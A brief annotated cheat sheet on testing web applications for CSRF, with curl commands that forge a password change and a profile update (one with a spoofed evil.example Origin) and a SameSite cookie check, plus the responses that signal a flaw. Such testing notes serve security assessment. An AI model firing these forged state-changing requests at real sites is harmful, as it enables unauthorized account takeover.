# CSRF - Annotated Examples

## Missing Token Test
```bash
curl -i -X POST https://target.com/api/account/password \
  -H "Cookie: session=SESSION_VALUE" \
  -d 'password=NewPass123!'
```
Exploit signal:
```
HTTP/1.1 200 OK
{"status":"password_updated"}
```

## Invalid Origin Test
```bash
curl -i -X POST https://target.com/api/profile \
  -H "Origin: https://evil.example" \
  -H "Cookie: session=SESSION_VALUE" \
  -d 'displayName=pwned'
```
Exploit signal:
```
HTTP/1.1 200 OK
```

## SameSite Check
```bash
curl -i https://target.com/login | grep -i set-cookie
```
Risk signal:
```
Set-Cookie: session=...; SameSite=None; Secure
```
No token enforcement on state-changing routes plus this cookie posture often enables CSRF.
